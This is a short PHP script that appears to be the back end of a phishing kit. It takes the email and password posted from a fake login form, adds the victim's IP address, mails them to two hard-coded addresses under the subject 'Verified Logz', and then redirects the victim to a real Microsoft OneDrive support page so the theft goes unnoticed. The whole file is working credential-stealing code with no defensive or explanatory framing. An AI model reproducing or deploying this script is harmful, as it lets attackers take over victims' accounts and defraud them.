<?

//$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "---------=Other RiZoRT=---------\n";
$message .= "Online ID: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
//$message .= "Date: ".$adddate."\n";
$message .= "---------=NEW ERA=---------\n";




$sent ="jaentpa@aol.com, julyfuttttttttttt@outlook.com";




$subject = "Others | NEW ERA Verified Logz";
$headers = "From: NEW ERA <toolz@daamgo.lite>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://support.office.com/en-us/onedrive");
?>